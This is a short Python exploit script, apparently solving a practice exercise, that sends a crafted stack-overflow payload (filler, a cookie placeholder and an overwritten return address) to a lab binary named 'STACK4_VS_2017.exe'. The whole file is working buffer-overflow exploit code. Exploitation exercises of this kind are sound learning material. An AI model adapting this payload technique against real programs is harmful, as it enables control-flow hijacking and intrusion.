import sys
from subprocess import Popen, PIPE

buffer = b"A" * 80
cookie = b"B" * 4
s = b"C" * 4
r =  b"\x84\x10\x40\x00"

payload = buffer + cookie + s + r


p1 = Popen("STACK4_VS_2017.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")

p1.communicate(payload)
p1.wait()
input()
